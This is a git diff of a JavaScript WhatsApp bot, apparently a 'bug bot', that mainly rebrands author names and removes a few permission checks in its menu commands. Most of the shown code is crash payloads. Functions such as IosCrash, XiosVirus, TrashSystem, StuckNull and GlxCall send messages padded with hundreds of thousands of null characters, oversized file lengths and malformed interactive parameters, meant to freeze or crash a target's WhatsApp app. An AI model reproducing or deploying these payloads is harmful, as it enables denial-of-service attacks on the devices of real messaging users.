@@ -1242,7 +1923,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				}
 			}, {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function Gsz(X, QTD) {
@@ -1256,7 +1937,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 								hasMediaAttachment: true
 							},
 							body: {
-								text: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️" + "\u0000".repeat(900000)
+								text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(900000)
 							},
 							nativeFlowMessage: {
 								messageParamsJson: ""
@@ -1276,7 +1957,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			}, {
 				quoted: QTD
 			})
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function Tedex(X, QTD) {
@@ -1290,7 +1971,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 								'hasMediaAttachment': true
 							},
 							'body': {
-								'text': '𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️' + '\x00'.repeat(950000)
+								'text': '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉' + '\x00'.repeat(950000)
 							},
 							'nativeFlowMessage': {
 								'messageParamsJson': '\x00'
@@ -1309,7 +1990,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			}, {
 				quoted: QTD
 			});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function IosCrash(LockJids) {
@@ -1323,7 +2004,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: LockJids
 				}
 			})
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function XiosVirus(jid) {
@@ -1350,7 +2031,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			}, {
 				'messageId': null
 			});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function XiosPay(jid) {
@@ -1364,7 +2045,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					'jid': jid
 				}
 			});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function TrashSystem(X, ThM, Ptcp = true) {
@@ -1395,7 +2076,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 								nativeFlowMessage: {
 									buttons: [{
 											name: "cta_url",
-											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/AkmalMods\", merchant_url: \"https://youtube.com/AkmalMods\" }",
+											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/PakTzy\" }",
 										},
 										{
 											name: "call_permission_request",
@@ -1421,7 +2102,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 											fileLength: "9999999999999",
 											pageCount: 1316134911,
 											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-											fileName: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 𝐁𝐔𝐆 𝐕𝟐〽️",
+											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
 											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
 											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
 											mediaKeyTimestamp: "1724474503",
@@ -1443,7 +2124,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				} : {}
 			);
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function StuckNull(X, ThM, Ptcp = true) {
@@ -1474,7 +2155,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 								nativeFlowMessage: {
 									buttons: [{
 											name: "cta_url",
-											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/AkmalMods\", merchant_url: \"https://youtube.com/AkmalMods\" }",
+											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/PakTzy\" }",
 										},
 										{
 											name: "call_permission_request",
@@ -1498,7 +2179,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 											fileLength: "9999999999999",
 											pageCount: 1316134911,
 											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-											fileName: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 𝐁𝐔𝐆 𝐕𝟐〽️",
+											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
 											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
 											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
 											mediaKeyTimestamp: "1724474503",
@@ -1520,7 +2201,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				} : {}
 			);
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function StuckSql(X, ThM, Ptcp = true) {
@@ -1552,7 +2233,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 								nativeFlowMessage: {
 									buttons: [{
 											name: "cta_url",
-											buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/AkmalMods\", merchant_url: \"https://youtube.com/AkmalMods\" }",
+											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/PakTzy\" }",
 										},
 										{
 											name: "call_permission_request",
@@ -1576,7 +2257,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 											fileLength: "9999999999999",
 											pageCount: 1316134911,
 											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-											fileName: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂 𝐁𝐔𝐆 𝐕𝟐〽️",
+											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
 											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
 											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
 											mediaKeyTimestamp: "1724474503",
@@ -1601,7 +2282,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function GlX(X, Ptcp = true) {
@@ -1610,12 +2291,12 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 						message: {
 							interactiveResponseMessage: {
 								body: {
-									text: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️",
+									text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
 									format: "EXTENSIONS_1"
 								},
 								nativeFlowResponseMessage: {
 									name: 'galaxy_message',
-									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 									version: 3
 								}
 							}
@@ -1628,7 +2309,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				} : {}
 			);
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function GlxCall(X, ThM, cct = false, ptcp = false) {
@@ -1646,7 +2327,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										fileLength: "9999999999999",
 										pageCount: 9007199254740991,
 										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-										fileName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
 										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 										mediaKeyTimestamp: "1723855952",
@@ -1659,14 +2340,14 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									hasMediaAttachment: true
 								},
 								body: {
-									text: "‎𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+									text: "‎𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 								},
 								nativeFlowMessage: {
-									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
+									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
 									buttons: [
 										cct ? {
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										} : {
 											name: "payment_method",
 											buttonParamsJson: ""
@@ -1705,7 +2386,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										},
 										{
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										},
 										{
 											name: "galaxy_message",
@@ -1731,7 +2412,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function GlxCallX(X, ThM, cct = false, ptcp = false) {
@@ -1749,7 +2430,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										fileLength: "9999999999999",
 										pageCount: 9007199254740991,
 										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-										fileName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
 										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 										mediaKeyTimestamp: "1723855952",
@@ -1765,11 +2446,11 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 									text: "‎⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
 								},
 								nativeFlowMessage: {
-									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
+									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
 									buttons: [
 										cct ? {
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										} : {
 											name: "payment_method",
 											buttonParamsJson: ""
@@ -1808,7 +2489,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 										},
 										{
 											name: "single_select",
-											buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
 										},
 										{
 											name: "galaxy_message",
@@ -1834,7 +2515,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					jid: X
 				}
 			} : {});
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function TxIos(X, Ptcp = false) {
@@ -1877,8 +2558,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 							"ephemeralSettingTimestamp": "1728090592378",
 							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
 							"externalAdReply": {
-								"title": "𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽",
-								"body": "𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
+								"title": "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽",
+								"body": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
 								"mediaType": "VIDEO",
 								"renderLargerThumbnail": true,
 								"previewTtpe": "VIDEO",
@@ -1933,7 +2614,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				} : {}
 			);
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 
 		async function TxOs(X, Ptcp = false) {
@@ -1982,8 +2663,8 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 							ephemeralSettingTimestamp: "1728090592378",
 							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
 							externalAdReply: {
-								title: "𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽",
-								body: "𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
+								title: "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽",
+								body: "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
 								mediaType: "VIDEO",
 								renderLargerThumbnail: true,
 								previewType: "VIDEO",
@@ -2037,7 +2718,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					}
 				} : {}
 			);
-			console.log(chalk.green("Send Bug By AkmalMods〽️"));
+			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
 		};
 		//GROUP\\
 		async function caltx(LockJids) {
@@ -2070,7 +2751,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 								hasMediaAttachment: true
 							},
 							body: {
-								text: "𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️" + "\u0000".repeat(900000)
+								text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(900000)
 							},
 							nativeFlowMessage: {
 								messageParamsJson: ""
@@ -2096,7 +2777,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 						"liveLocationMessage": {
 							"degreesLatitude": "x",
 							"degreesLongitude": "x",
-							"caption": `🩸⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️` + "\u0000",
+							"caption": `🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉` + "\u0000",
 							"sequenceNumber": "0",
 							"jpegThumbnail": ""
 						}
@@ -2146,7 +2827,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 							"newsletterJid": `120363298524333143@newsletter`,
 							"newsletterName": "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
 							"jpegThumbnail": "",
-							"caption": `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
+							"caption": `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
 							"inviteExpiration": Date.now() + 1814400000
 						}
 					}
@@ -2357,7 +3038,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			},
 			message: {
 				listResponseMessage: {
-					title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`
+					title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`
 				}
 			}
 		}
@@ -2387,12 +3068,12 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					externalAdReply: {
 						showAdAttribution: true,
 						renderLargerThumbnail: false,
-						title: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`,
-						body: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+						title: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
+						body: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 						previewType: "VIDEO",
 						thumbnail: V1,
 						sourceUrl: ``,
-						mediaUrl: `https://youtube.com/@AkmalMods`
+						mediaUrl: `https://youtube.com/@PakTzy`
 					}
 				},
 				text: teks
@@ -2413,7 +3094,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					itemCount: `777`,
 					status: "INQUIRY",
 					surface: "CATALOG",
-					message: `𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽️`,
+					message: `𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️`,
 					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
 				}
 			},
@@ -2436,7 +3117,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 					itemCount: `777`,
 					status: "INQUIRY",
 					surface: "CATALOG",
-					message: `𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️️`,
+					message: `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉️`,
 					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
 				}
 			},
@@ -2509,7 +3190,7 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 		const downloadMp3 = async (url) => {
 			try {
 				// Panggil API untuk mendapatkan data MP3
-				let response = await fetch(`https://api.betabotz.eu.org/api/download/ytmp3?url=${url}&apikey=GetsuZo`);
+				let response = await fetch(`https://api.betabotz.eu.org/api/download/ytmp3?url=${url}&apikey=XpoX`);
 				let data = await response.json();
 
 				if (!data.status) throw new Error('Failed to fetch data from API');
@@ -2681,7 +3362,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 		//=================================================//
 		switch (command) {
 			case "public": {
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (db.data.settings[botNumber].public == true) return zreply("Sudah Di Mode Public")
 				db.data.settings[botNumber].public = true
@@ -2689,7 +3369,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			}
 			break
 			case "self": {
-				
 				if (!isCreator) return zreply(mess.owner)
 				if (db.data.settings[botNumber].public == false) return zreply("Sudah Di Mode Self")
 				db.data.settings[botNumber].public = false
@@ -2698,17 +3377,14 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			break
 			//=================================================//
 			case "speed":
-				if (!isPremium) return zreply(mess.premium)
 				zreply(`*${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()} Seconds*`)
 				break
 				//=================================================//
 			case "runtime":
-				if (!isPremium) return zreply(mess.premium)
 				zreply(`${runtime(process.uptime())}`)
 				break
 				//=================================================//
 			case "restart":
-				
 				if (!isCreator) return zreply(mess.owner)
 				zreply("Restarting Bot.....")
 				setTimeout(() => {
@@ -2716,7 +3392,6 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 				}, 3000)
 				break
 			case "shutdown": {
-				
 				if (!isCreator) return zreply(mess.owner)
 				zreply(`Shutdown Bot...`)
 				await sleep(5000)
@@ -2730,39 +3405,38 @@ module.exports = async (VxoZap, m, chatUpdate, store) => {
 			//MENU\\
 			//=================================================//
 			case "menu": {
-									if (!isCreator) return zreply(mess.owner)
 				let X1 = [TheZhiro, nulll, nulll2]
 				let randomIndex = Math.floor(Math.random() * X1.length)
 				let V1 = X1[randomIndex]
 				let BUTTON = `
-╭──(         ᴄᴀʏᴡᴢᴢ          )
-║ᨒ 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀\`\〽️
-│🌸 𝐍𝐚𝐦𝐞 : ${m.pushName}
+╭──(         𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸         )
+║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
+│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
 ║▬▭▬▭▬▭▬▭▬▭
-│🌸 𝐎𝐰𝐧𝐞𝐫 : ${author}
-║🌸 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂\`\𐁘
-│🌸 𝐎𝐰𝐧 𝐍𝐨 : 083827666602
-║🌸 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
-│▬▭「 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ 」▭▬
-║› 𝐉𝐀𝐂𝐊𝐕𝟐 ©Copyright
+│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
+║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙋𝙖𝙠 𝙏𝙯𝙮 𝘿𝙚𝙫\`\𐁘
+│🎭 𝐎𝐰𝐧 𝐍𝐨 : 081991410940
+║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
+│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
+║› 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨 ©Copyright
 ╰━━━━━━━━━━━━━━━━━━━⬣`
 				let MSG = `
-╭──(         ᴄᴀʏᴡᴢᴢ          )
-║ᨒ 𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀\`\〽️
-| 🌸 𝐍𝐚𝐦𝐞 : ${m.pushName}
